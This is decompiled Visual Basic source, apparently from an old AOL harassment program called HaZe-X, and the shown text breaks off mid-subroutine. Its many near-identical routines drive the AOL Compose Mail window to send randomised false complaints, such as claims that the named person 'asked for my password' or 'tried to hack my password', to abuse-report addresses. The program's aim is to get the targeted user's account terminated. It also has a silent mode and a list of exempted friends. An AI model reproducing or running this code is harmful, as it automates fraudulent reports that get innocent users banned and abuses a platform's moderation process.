Dim l0528 As Variant
Dim l052C As Variant
Dim l0530 As Variant
Dim l0534 As Variant
Dim l0538 As Variant
Dim l053C As Variant
Dim l0540 As String
Randomize
For l0500 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0504 = 6
    l0508 = Int(Rnd * l0504 + 1)
      If  l0508 = 1 Then l050C$ = "" & Form1.Room & " asked for my password."
      If  l0508 = 2 Then l050C$ = "" & Form1.Room & " tried to hack my password."
      If  l0508 = 3 Then l050C$ = "Read!" & Form1.Room & " asked for my password."
      If  l0508 = 4 Then l050C$ = "Please do something about " & Form1.Room & "."
      If  l0508 = 5 Then l050C$ = "This guy wants my password:" & Form1.Room
      If  l0508 = 6 Then l050C$ = "Please help " & Form1.Room & " wants my password."
      If  l0508 = 7 Then l050C$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l050E) Like "*KaOS*" Or UCase$(l050E) Like "*NiPP*" Or UCase$(l050E) Like "*CHOP*" Or UCase$(l050E) Like "*LoRe*" Or UCase$(l050E) Like "*CouNT*" Or UCase$(l050E) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX1"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0518% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l051A = extfn24E0(l0518%, "Compose Mail")
DoEvents
Loop Until l051A <> 0
l051E = fn5D0(l0512(), l051A, "*", "_AOL_Edit", Null)
subF00 l0512(1), "TOSGFX1"
subF00 l0512(3), "" & l050C$
l0522$ = Chr(10)
subF00 l0512(4), "" & Room & ":" & " " & "" & Text1 & l0522$ & l0522$
l0524 = extfn24E0(l051A, "Send")
l0528 = extfn2518(l051A, "_AOL_Icon")
l052C = extfn13D0(l0528, 2)
l0530 = extfn13D0(l052C, 2)
l0534 = extfn1750(l0528, c0074, 0, 0&)
l0538 = extfn1750(l0528, c007C, 0, 0&)
subF38 .4#
subFE0
For l053C = 0 To Form1.Combo1.ListCount
l0540$ = Form1.Combo1.List(l053C)
If  Room = l0540$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3EC8 ()
Dim l0542 As Variant
Dim l0546 As Variant
Dim l054A As Variant
Dim l054E As String
Dim l0550 As Variant
Dim l0554() As Integer
Dim l055A As Integer
Dim l055C As Variant
Dim l0560 As Variant
Dim l0564 As String
Dim l0566 As Variant
Dim l056A As Variant
Dim l056E As Variant
Dim l0572 As Variant
Dim l0576 As Variant
Dim l057A As Variant
Dim l057E As Variant
Dim l0582 As String
Randomize
For l0542 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0546 = 6
    l054A = Int(Rnd * l0546 + 1)
      If  l054A = 1 Then l054E$ = "" & Form1.Room & " asked for my password."
      If  l054A = 2 Then l054E$ = "" & Form1.Room & " tried to hack my password."
      If  l054A = 3 Then l054E$ = "Read!" & Form1.Room & " asked for my password."
      If  l054A = 4 Then l054E$ = "Please do something about " & Form1.Room & "."
      If  l054A = 5 Then l054E$ = "This guy wants my password:" & Form1.Room
      If  l054A = 6 Then l054E$ = "Please help " & Form1.Room & " wants my password."
      If  l054A = 7 Then l054E$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0550) Like "*KaOS*" Or UCase$(l0550) Like "*NiPP*" Or UCase$(l0550) Like "*CHOP*" Or UCase$(l0550) Like "*LoRe*" Or UCase$(l0550) Like "*CouNT*" Or UCase$(l0550) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX10"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l055A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l055C = extfn24E0(l055A%, "Compose Mail")
DoEvents
Loop Until l055C <> 0
l0560 = fn5D0(l0554(), l055C, "*", "_AOL_Edit", Null)
subF00 l0554(1), "TOSGFX10"
subF00 l0554(3), "" & l054E$
subF00 l0554(4), "" & Room & ":" & " " & "" & Text1 & l0564$ & l0564$
l0566 = extfn24E0(l055C, "Send")
l056A = extfn2518(l055C, "_AOL_Icon")
l056E = extfn13D0(l056A, 2)
l0572 = extfn13D0(l056E, 2)
l0576 = extfn1750(l056A, c0074, 0, 0&)
l057A = extfn1750(l056A, c007C, 0, 0&)
subF38 .4#
subFE0
For l057E = 0 To Form1.Combo1.ListCount
l0582$ = Form1.Combo1.List(l057E)
If  Room = l0582$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3F00 ()
Dim l0584 As Variant
Dim l0588 As Variant
Dim l058C As Variant
Dim l0590 As String
Dim l0592 As Variant
Dim l0596() As Integer
Dim l059C As Integer
Dim l059E As Variant
Dim l05A2 As Variant
Dim l05A6 As String
Dim l05A8 As Variant
Dim l05AC As Variant
Dim l05B0 As Variant
Dim l05B4 As Variant
Dim l05B8 As Variant
Dim l05BC As Variant
Dim l05C0 As Variant
Dim l05C4 As String
Randomize
For l0584 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0588 = 6
    l058C = Int(Rnd * l0588 + 1)
      If  l058C = 1 Then l0590$ = "" & Form1.Room & " asked for my password."
      If  l058C = 2 Then l0590$ = "" & Form1.Room & " tried to hack my password."
      If  l058C = 3 Then l0590$ = "Read!" & Form1.Room & " asked for my password."
      If  l058C = 4 Then l0590$ = "Please do something about " & Form1.Room & "."
      If  l058C = 5 Then l0590$ = "This guy wants my password:" & Form1.Room
      If  l058C = 6 Then l0590$ = "Please help " & Form1.Room & " wants my password."
      If  l058C = 7 Then l0590$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0592) Like "*KaOS*" Or UCase$(l0592) Like "*NiPP*" Or UCase$(l0592) Like "*CHOP*" Or UCase$(l0592) Like "*LoRe*" Or UCase$(l0592) Like "*CouNT*" Or UCase$(l0592) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX2"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l059C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l059E = extfn24E0(l059C%, "Compose Mail")
DoEvents
Loop Until l059E <> 0
l05A2 = fn5D0(l0596(), l059E, "*", "_AOL_Edit", Null)
subF00 l0596(1), "TOSGFX2"
subF00 l0596(3), "" & l0590$
l05A6$ = Chr(10)
subF00 l0596(4), "" & Room & ":" & " " & "" & Text1 & l05A6$ & l05A6$
l05A8 = extfn24E0(l059E, "Send")
l05AC = extfn2518(l059E, "_AOL_Icon")
l05B0 = extfn13D0(l05AC, 2)
l05B4 = extfn13D0(l05B0, 2)
l05B8 = extfn1750(l05AC, c0074, 0, 0&)
l05BC = extfn1750(l05AC, c007C, 0, 0&)
subF38 .4#
subFE0
For l05C0 = 0 To Form1.Combo1.ListCount
l05C4$ = Form1.Combo1.List(l05C0)
If  Room = l05C4$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3F38 ()
Dim l05C6 As Variant
Dim l05CA As Variant
Dim l05CE As Variant
Dim l05D2 As String
Dim l05D4 As Variant
Dim l05D8() As Integer
Dim l05DE As Integer
Dim l05E0 As Variant
Dim l05E4 As Variant
Dim l05E8 As String
Dim l05EA As Variant
Dim l05EE As Variant
Dim l05F2 As Variant
Dim l05F6 As Variant
Dim l05FA As Variant
Dim l05FE As Variant
Dim l0602 As Variant
Dim l0606 As String
Randomize
For l05C6 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l05CA = 6
    l05CE = Int(Rnd * l05CA + 1)
      If  l05CE = 1 Then l05D2$ = "" & Form1.Room & " asked for my password."
      If  l05CE = 2 Then l05D2$ = "" & Form1.Room & " tried to hack my password."
      If  l05CE = 3 Then l05D2$ = "Read!" & Form1.Room & " asked for my password."
      If  l05CE = 4 Then l05D2$ = "Please do something about " & Form1.Room & "."
      If  l05CE = 5 Then l05D2$ = "This guy wants my password:" & Form1.Room
      If  l05CE = 6 Then l05D2$ = "Please help " & Form1.Room & " wants my password."
      If  l05CE = 7 Then l05D2$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l05D4) Like "*KaOS*" Or UCase$(l05D4) Like "*NiPP*" Or UCase$(l05D4) Like "*CHOP*" Or UCase$(l05D4) Like "*LoRe*" Or UCase$(l05D4) Like "*CouNT*" Or UCase$(l05D4) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX3"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l05DE% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l05E0 = extfn24E0(l05DE%, "Compose Mail")
DoEvents
Loop Until l05E0 <> 0
l05E4 = fn5D0(l05D8(), l05E0, "*", "_AOL_Edit", Null)
subF00 l05D8(1), "TOSGFX3"
subF00 l05D8(3), "" & l05D2$
l05E8$ = Chr(10)
subF00 l05D8(4), "" & Room & ":" & " " & "" & Text1 & l05E8$ & l05E8$
l05EA = extfn24E0(l05E0, "Send")
l05EE = extfn2518(l05E0, "_AOL_Icon")
l05F2 = extfn13D0(l05EE, 2)
l05F6 = extfn13D0(l05F2, 2)
l05FA = extfn1750(l05EE, c0074, 0, 0&)
l05FE = extfn1750(l05EE, c007C, 0, 0&)
subF38 .4#
subFE0
For l0602 = 0 To Form1.Combo1.ListCount
l0606$ = Form1.Combo1.List(l0602)
If  Room = l0606$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3F70 ()
Dim l0608 As Variant
Dim l060C As Variant
Dim l0610 As Variant
Dim l0614 As String
Dim l0616 As Variant
Dim l061A() As Integer
Dim l0620 As Integer
Dim l0622 As Variant
Dim l0626 As Variant
Dim l062A As String
Dim l062C As Variant
Dim l0630 As Variant
Dim l0634 As Variant
Dim l0638 As Variant
Dim l063C As Variant
Dim l0640 As Variant
Dim l0644 As Variant
Dim l0648 As String
Randomize
For l0608 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l060C = 6
    l0610 = Int(Rnd * l060C + 1)
      If  l0610 = 1 Then l0614$ = "" & Form1.Room & " asked for my password."
      If  l0610 = 2 Then l0614$ = "" & Form1.Room & " tried to hack my password."
      If  l0610 = 3 Then l0614$ = "Read!" & Form1.Room & " asked for my password."
      If  l0610 = 4 Then l0614$ = "Please do something about " & Form1.Room & "."
      If  l0610 = 5 Then l0614$ = "This guy wants my password:" & Form1.Room
      If  l0610 = 6 Then l0614$ = "Please help " & Form1.Room & " wants my password."
      If  l0610 = 7 Then l0614$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0616) Like "*KaOS*" Or UCase$(l0616) Like "*NiPP*" Or UCase$(l0616) Like "*CHOP*" Or UCase$(l0616) Like "*LoRe*" Or UCase$(l0616) Like "*CouNT*" Or UCase$(l0616) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX4"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0620% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0622 = extfn24E0(l0620%, "Compose Mail")
DoEvents
Loop Until l0622 <> 0
l0626 = fn5D0(l061A(), l0622, "*", "_AOL_Edit", Null)
subF00 l061A(1), "TOSGFX4"
subF00 l061A(3), "" & l0614$
l062A$ = Chr(10)
subF00 l061A(4), "" & Room & ":" & " " & "" & Text1 & l062A$ & l062A$
l062C = extfn24E0(l0622, "Send")
l0630 = extfn2518(l0622, "_AOL_Icon")
l0634 = extfn13D0(l0630, 2)
l0638 = extfn13D0(l0634, 2)
l063C = extfn1750(l0630, c0074, 0, 0&)
l0640 = extfn1750(l0630, c007C, 0, 0&)
subF38 .4#
subFE0
For l0644 = 0 To Form1.Combo1.ListCount
l0648$ = Form1.Combo1.List(l0644)
If  Room = l0648$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3FA8 ()
Dim l064A As Variant
Dim l064E As Variant
Dim l0652 As Variant
Dim l0656 As String
Dim l0658 As Variant
Dim l065C() As Integer
Dim l0662 As Integer
Dim l0664 As Variant
Dim l0668 As Variant
Dim l066C As String
Dim l066E As Variant
Dim l0672 As Variant
Dim l0676 As Variant
Dim l067A As Variant
Dim l067E As Variant
Dim l0682 As Variant
Dim l0686 As Variant
Dim l068A As String
Randomize
For l064A = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l064E = 6
    l0652 = Int(Rnd * l064E + 1)
      If  l0652 = 1 Then l0656$ = "" & Form1.Room & " asked for my password."
      If  l0652 = 2 Then l0656$ = "" & Form1.Room & " tried to hack my password."
      If  l0652 = 3 Then l0656$ = "Read!" & Form1.Room & " asked for my password."
      If  l0652 = 4 Then l0656$ = "Please do something about " & Form1.Room & "."
      If  l0652 = 5 Then l0656$ = "This guy wants my password:" & Form1.Room
      If  l0652 = 6 Then l0656$ = "Please help " & Form1.Room & " wants my password."
      If  l0652 = 7 Then l0656$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0658) Like "*KaOS*" Or UCase$(l0658) Like "*NiPP*" Or UCase$(l0658) Like "*CHOP*" Or UCase$(l0658) Like "*LoRe*" Or UCase$(l0658) Like "*CouNT*" Or UCase$(l0658) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX5"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0662% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0664 = extfn24E0(l0662%, "Compose Mail")
DoEvents
Loop Until l0664 <> 0
l0668 = fn5D0(l065C(), l0664, "*", "_AOL_Edit", Null)
subF00 l065C(1), "TOSGFX5"
subF00 l065C(3), "" & l0656$
l066C$ = Chr(10)
subF00 l065C(4), "" & Room & ":" & " " & "" & Text1 & l066C$ & l066C$
l066E = extfn24E0(l0664, "Send")
l0672 = extfn2518(l0664, "_AOL_Icon")
l0676 = extfn13D0(l0672, 2)
l067A = extfn13D0(l0676, 2)
l067E = extfn1750(l0672, c0074, 0, 0&)
l0682 = extfn1750(l0672, c007C, 0, 0&)
subF38 .4#
subFE0
For l0686 = 0 To Form1.Combo1.ListCount
l068A$ = Form1.Combo1.List(l0686)
If  Room = l068A$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub3FE0 ()
Dim l068C As Variant
Dim l0690 As Variant
Dim l0694 As Variant
Dim l0698 As String
Dim l069A As Variant
Dim l069E() As Integer
Dim l06A4 As Integer
Dim l06A6 As Variant
Dim l06AA As Variant
Dim l06AE As String
Dim l06B0 As Variant
Dim l06B4 As Variant
Dim l06B8 As Variant
Dim l06BC As Variant
Dim l06C0 As Variant
Dim l06C4 As Variant
Dim l06C8 As Variant
Dim l06CC As String
Randomize
For l068C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0690 = 6
    l0694 = Int(Rnd * l0690 + 1)
      If  l0694 = 1 Then l0698$ = "" & Form1.Room & " asked for my password."
      If  l0694 = 2 Then l0698$ = "" & Form1.Room & " tried to hack my password."
      If  l0694 = 3 Then l0698$ = "Read!" & Form1.Room & " asked for my password."
      If  l0694 = 4 Then l0698$ = "Please do something about " & Form1.Room & "."
      If  l0694 = 5 Then l0698$ = "This guy wants my password:" & Form1.Room
      If  l0694 = 6 Then l0698$ = "Please help " & Form1.Room & " wants my password."
      If  l0694 = 7 Then l0698$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l069A) Like "*KaOS*" Or UCase$(l069A) Like "*NiPP*" Or UCase$(l069A) Like "*CHOP*" Or UCase$(l069A) Like "*LoRe*" Or UCase$(l069A) Like "*CouNT*" Or UCase$(l069A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX6"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l06A4% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l06A6 = extfn24E0(l06A4%, "Compose Mail")
DoEvents
Loop Until l06A6 <> 0
l06AA = fn5D0(l069E(), l06A6, "*", "_AOL_Edit", Null)
subF00 l069E(1), "TOSGFX6"
subF00 l069E(3), "" & l0698$
l06AE$ = Chr(10)
subF00 l069E(4), "" & Room & ":" & " " & "" & Text1 & l06AE$ & l06AE$
l06B0 = extfn24E0(l06A6, "Send")
l06B4 = extfn2518(l06A6, "_AOL_Icon")
l06B8 = extfn13D0(l06B4, 2)
l06BC = extfn13D0(l06B8, 2)
l06C0 = extfn1750(l06B4, c0074, 0, 0&)
l06C4 = extfn1750(l06B4, c007C, 0, 0&)
subF38 .4#
subFE0
For l06C8 = 0 To Form1.Combo1.ListCount
l06CC$ = Form1.Combo1.List(l06C8)
If  Room = l06CC$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub4018 ()
Dim l06CE As Variant
Dim l06D2 As Variant
Dim l06D6 As Variant
Dim l06DA As String
Dim l06DC As Variant
Dim l06E0() As Integer
Dim l06E6 As Integer
Dim l06E8 As Variant
Dim l06EC As Variant
Dim l06F0 As String
Dim l06F2 As Variant
Dim l06F6 As Variant
Dim l06FA As Variant
Dim l06FE As Variant
Dim l0702 As Variant
Dim l0706 As Variant
Dim l070A As Variant
Dim l070E As String
Randomize
For l06CE = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l06D2 = 6
    l06D6 = Int(Rnd * l06D2 + 1)
      If  l06D6 = 1 Then l06DA$ = "" & Form1.Room & " asked for my password."
      If  l06D6 = 2 Then l06DA$ = "" & Form1.Room & " tried to hack my password."
      If  l06D6 = 3 Then l06DA$ = "Read!" & Form1.Room & " asked for my password."
      If  l06D6 = 4 Then l06DA$ = "Please do something about " & Form1.Room & "."
      If  l06D6 = 5 Then l06DA$ = "This guy wants my password:" & Form1.Room
      If  l06D6 = 6 Then l06DA$ = "Please help " & Form1.Room & " wants my password."
      If  l06D6 = 7 Then l06DA$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l06DC) Like "*KaOS*" Or UCase$(l06DC) Like "*NiPP*" Or UCase$(l06DC) Like "*CHOP*" Or UCase$(l06DC) Like "*LoRe*" Or UCase$(l06DC) Like "*CouNT*" Or UCase$(l06DC) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX7"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l06E6% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l06E8 = extfn24E0(l06E6%, "Compose Mail")
DoEvents
Loop Until l06E8 <> 0
l06EC = fn5D0(l06E0(), l06E8, "*", "_AOL_Edit", Null)
subF00 l06E0(1), "TOSGFX7"
subF00 l06E0(3), "" & l06DA$
l06F0$ = Chr(10)
subF00 l06E0(4), "" & Room & ":" & " " & "" & Text1 & l06F0$ & l06F0$
l06F2 = extfn24E0(l06E8, "Send")
l06F6 = extfn2518(l06E8, "_AOL_Icon")
l06FA = extfn13D0(l06F6, 2)
l06FE = extfn13D0(l06FA, 2)
l0702 = extfn1750(l06F6, c0074, 0, 0&)
l0706 = extfn1750(l06F6, c007C, 0, 0&)
subF38 .4#
subFE0
For l070A = 0 To Form1.Combo1.ListCount
l070E$ = Form1.Combo1.List(l070A)
If  Room = l070E$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub4050 ()
Dim l0710 As Variant
Dim l0714 As Variant
Dim l0718 As Variant
Dim l071C As String
Dim l071E As Variant
Dim l0722() As Integer
Dim l0728 As Integer
Dim l072A As Variant
Dim l072E As Variant
Dim l0732 As String
Dim l0734 As Variant
Dim l0738 As Variant
Dim l073C As Variant
Dim l0740 As Variant
Dim l0744 As Variant
Dim l0748 As Variant
Dim l074C As Variant
Dim l0750 As String
Randomize
For l0710 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0714 = 6
    l0718 = Int(Rnd * l0714 + 1)
      If  l0718 = 1 Then l071C$ = "" & Form1.Room & " asked for my password."
      If  l0718 = 2 Then l071C$ = "" & Form1.Room & " tried to hack my password."
      If  l0718 = 3 Then l071C$ = "Read!" & Form1.Room & " asked for my password."
      If  l0718 = 4 Then l071C$ = "Please do something about " & Form1.Room & "."
      If  l0718 = 5 Then l071C$ = "This guy wants my password:" & Form1.Room
      If  l0718 = 6 Then l071C$ = "Please help " & Form1.Room & " wants my password."
      If  l0718 = 7 Then l071C$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l071E) Like "*KaOS*" Or UCase$(l071E) Like "*NiPP*" Or UCase$(l071E) Like "*CHOP*" Or UCase$(l071E) Like "*LoRe*" Or UCase$(l071E) Like "*CouNT*" Or UCase$(l071E) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX8"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l0728% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l072A = extfn24E0(l0728%, "Compose Mail")
DoEvents
Loop Until l072A <> 0
l072E = fn5D0(l0722(), l072A, "*", "_AOL_Edit", Null)
subF00 l0722(1), "TOSGFX8"
subF00 l0722(3), "" & l071C$
l0732$ = Chr(10)
subF00 l0722(4), "" & Room & ":" & " " & "" & Text1 & l0732$ & l0732$
l0734 = extfn24E0(l072A, "Send")
l0738 = extfn2518(l072A, "_AOL_Icon")
l073C = extfn13D0(l0738, 2)
l0740 = extfn13D0(l073C, 2)
l0744 = extfn1750(l0738, c0074, 0, 0&)
l0748 = extfn1750(l0738, c007C, 0, 0&)
subF38 .4#
subFE0
For l074C = 0 To Form1.Combo1.ListCount
l0750$ = Form1.Combo1.List(l074C)
If  Room = l0750$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub sub4088 ()
Dim l0752 As Variant
Dim l0756 As Variant
Dim l075A As Variant
Dim l075E As String
Dim l0760 As Variant
Dim l0764() As Integer
Dim l076A As Integer
Dim l076C As Variant
Dim l0770 As Variant
Dim l0774 As String
Dim l0776 As Variant
Dim l077A As Variant
Dim l077E As Variant
Dim l0782 As Variant
Dim l0786 As Variant
Dim l078A As Variant
Dim l078E As Variant
Dim l0792 As String
Randomize
For l0752 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0756 = 6
    l075A = Int(Rnd * l0756 + 1)
      If  l075A = 1 Then l075E$ = "" & Form1.Room & " asked for my password."
      If  l075A = 2 Then l075E$ = "" & Form1.Room & " tried to hack my password."
      If  l075A = 3 Then l075E$ = "Read!" & Form1.Room & " asked for my password."
      If  l075A = 4 Then l075E$ = "Please do something about " & Form1.Room & "."
      If  l075A = 5 Then l075E$ = "This guy wants my password:" & Form1.Room
      If  l075A = 6 Then l075E$ = "Please help " & Form1.Room & " wants my password."
      If  l075A = 7 Then l075E$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0760) Like "*KaOS*" Or UCase$(l0760) Like "*NiPP*" Or UCase$(l0760) Like "*CHOP*" Or UCase$(l0760) Like "*LoRe*" Or UCase$(l0760) Like "*CouNT*" Or UCase$(l0760) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "(-•HaZe-X²·º•-)-By KaOS"
sub30B0 "(-•HaZe-X²·º•-)-TOSing-" & Room
sub30B0 "(-•HaZe-X²·º•-)-Method-TOSGFX9"
sub30B0 "(-•HaZe-X²·º•-)-Phrase-" & Panel3D5
End If
l076A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l076C = extfn24E0(l076A%, "Compose Mail")
DoEvents
Loop Until l076C <> 0
l0770 = fn5D0(l0764(), l076C, "*", "_AOL_Edit", Null)
subF00 l0764(1), "TOSGFX9"
subF00 l0764(3), "" & l075E$
l0774$ = Chr(10)
subF00 l0764(4), "" & Room & ":" & " " & "" & Text1 & l0774$ & l0774$
l0776 = extfn24E0(l076C, "Send")
l077A = extfn2518(l076C, "_AOL_Icon")
l077E = extfn13D0(l077A, 2)
l0782 = extfn13D0(l077E, 2)
l0786 = extfn1750(l077A, c0074, 0, 0&)
l078A = extfn1750(l077A, c007C, 0, 0&)
subF38 .4#
subFE0
For l078E = 0 To Form1.Combo1.ListCount
l0792$ = Form1.Combo1.List(l078E)
If  Room = l0792$ Then Exit Sub
 Form1.Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub gggggg_Click ()
Dim l0794 As Variant
Dim l0798 As Variant
Dim l079C As Variant
Dim l07A0 As String
Dim l07A2 As Variant
Dim l07A6() As Integer
Dim l07AC As Integer
Dim l07AE As Variant
Dim l07B2 As Variant
Dim l07B6 As String
Dim l07B8 As Variant
Dim l07BC As Variant
Dim l07C0 As Variant
Dim l07C4 As Variant
Dim l07C8 As Variant
Dim l07CC As Variant
Dim l07D0 As Variant
Dim l07D4 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0794 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0798 = 6
    l079C = Int(Rnd * l0798 + 1)
      If  l079C = 1 Then l07A0$ = "" & Form1.Room & " asked for my password."
      If  l079C = 2 Then l07A0$ = "" & Form1.Room & " tried to hack my password."
      If  l079C = 3 Then l07A0$ = "Read!" & Form1.Room & " asked for my password."
      If  l079C = 4 Then l07A0$ = "Please do something about " & Form1.Room & "."
      If  l079C = 5 Then l07A0$ = "This guy wants my password:" & Form1.Room
      If  l079C = 6 Then l07A0$ = "Please help " & Form1.Room & " wants my password."
      If  l079C = 7 Then l07A0$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l07A2) Like "*KaOS*" Or UCase$(l07A2) Like "*NiPP*" Or UCase$(l07A2) Like "*CHOP*" Or UCase$(l07A2) Like "*LoRe*" Or UCase$(l07A2) Like "*CouNT*" Or UCase$(l07A2) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN HO"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l07AC% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l07AE = extfn24E0(l07AC%, "Compose Mail")
DoEvents
Loop Until l07AE <> 0
l07B2 = fn5D0(l07A6(), l07AE, "*", "_AOL_Edit", Null)
subF00 l07A6(1), "Lotsen HO"
subF00 l07A6(3), "" & l07A0$
l07B6$ = Chr(10)
subF00 l07A6(4), "" & Room & ":" & " " & "" & Text1 & l07B6$ & l07B6$
l07B8 = extfn24E0(l07AE, "Send")
l07BC = extfn2518(l07AE, "_AOL_Icon")
